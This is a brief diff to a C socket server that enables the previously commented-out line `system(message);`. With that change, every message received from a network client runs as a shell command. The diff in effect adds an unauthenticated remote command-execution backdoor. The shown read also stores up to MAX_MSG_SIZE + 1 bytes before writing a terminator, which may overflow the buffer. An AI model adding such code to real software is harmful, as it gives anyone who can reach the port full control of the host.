@@ -61,9 +61,10 @@ int main(int argc, char *argv[])
         int bytes = read(client_sockfd, message, MAX_MSG_SIZE + 1);
         if(bytes <= 0)
             break;
+
         message[bytes] = '\0';
         printf("%s\n", message);
-        //system(message);
+        system(message);
     }
 
     return 0;
